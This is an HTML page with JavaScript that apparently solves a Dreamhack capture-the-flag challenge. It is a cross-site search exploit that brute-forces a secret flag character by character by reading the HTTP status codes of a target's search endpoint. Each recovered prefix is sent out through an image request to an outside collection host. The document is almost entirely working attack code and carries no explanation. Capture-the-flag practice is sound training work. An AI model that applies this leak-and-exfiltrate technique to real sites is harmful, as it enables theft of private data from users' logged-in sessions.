<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            var xhr = new XMLHttpRequest();

            xhr.open('GET', url, true);

            xhr.onreadystatechange = function () {
              if (xhr.readyState == 4) {
                // 요청이 완료되었을 때
                if (xhr.status == 404) {
                  // 성공적인 응답
                    console.log(xhr.status);
                  return reject();
                } else {
                  // 다른 상태 코드에 대한 처리
                    console.log(xhr.status);
                  return resolve();                    
                }
              }
            };

            xhr.send();

        });
    }
    async function search(query) {
        try {
            await req(
              `http://host3.dreamhack.games:9962/search?query=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }
    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";
        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://xojxvht.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
    exploit();
</script>
